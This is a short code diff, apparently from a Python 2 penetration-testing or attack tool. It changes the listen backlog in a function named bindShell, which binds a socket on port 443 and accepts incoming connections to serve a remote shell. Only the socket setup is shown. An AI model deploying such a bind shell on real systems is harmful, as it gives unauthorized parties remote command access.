@@ -538,7 +538,7 @@ def bindShell():
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
     try:
         server.bind((HOST, PORT))
-        server.listen(5)
+        server.listen(10)
         print "[!] Shell bound on 443"
         conn, addr = server.accept()
         print "[!] New Connection: %s" % addr[0]
